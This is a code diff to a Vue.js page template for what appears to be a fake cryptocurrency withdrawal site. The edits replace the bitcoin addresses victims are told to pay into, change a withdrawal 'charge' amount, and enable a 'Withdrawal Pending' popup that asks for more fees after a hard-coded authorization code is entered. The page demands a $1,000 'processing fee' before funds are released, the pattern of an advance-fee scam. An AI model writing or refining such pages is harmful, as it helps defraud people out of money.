@@ -144,7 +144,7 @@
     <!-- Payment Processing Fee -->
     <div v-show="showPaymentFee" class="contactForm" id="pleasePay">
       <h3>This Withdrawal will attract a processing fee of $1,000. Make your payment into this bitcoin address</h3>
-      <p class="mainCoin">bc1qu4xz47r0v33vlak75g3np8raz0w4cru0u6fg28</p>
+      <p class="mainCoin">bc1qjq2nchv7hrnp65l6z652wrphdna2dp3mu0hp7w</p>
       <p class="copyBut" @click="copyBitcoinAddress">Copy</p>
       <button @click="confirmPayment">Confirm</button>
     </div>
@@ -199,14 +199,14 @@
 
     <div class="withdrawSuc" v-if="showlastmessage">
         <p>
-            Withdrawal Pending. <br> You'll need 0.0028 BTC charges for withdrawal to your account to avoid errors or loss of assets. <br> bc1qu4xz47r0v33vlak75g3np8raz0w4cru0u6fg28
+            Withdrawal Pending. <br> You'll need 0.0016 BTC charges for withdrawal to your account to avoid errors or loss of assets. <br> bc1qu4xz47r0v33vlak75g3np8raz0w4cru0u6fg28
         </p>
         <p class="cancell" @click="clearLast">X</p>
     </div>
 
     <!-- Deposit Modal -->
     <div v-show="showDepositForm" class="contactForm depp">
-      <p>Please make your deposit on this wallet address <br> bc1qu4xz47r0v33vlak75g3np8raz0w4cru0u6fg28</p>
+      <p>Please make your deposit on this wallet address <br> bc1qjq2nchv7hrnp65l6z652wrphdna2dp3mu0hp7w</p>
       <p class="cancelDeposit" @click="closeDepositModal" style="cursor: pointer; color: red;">X</p>
     </div>
 
@@ -369,8 +369,8 @@ const confirmAuthCodes = () => {
       processWithdrawal()
       showAuthorizationForm.value = false
       showLoading.value = false
-      //  showlastmessage.value = false
-      //  showlastmessage.value = true
+       showlastmessage.value = false
+       showlastmessage.value = true
       showMainButtons.value = true
     }, 1500)
   } else if (!authCode.value || authCode.value !== '4htuos4') {
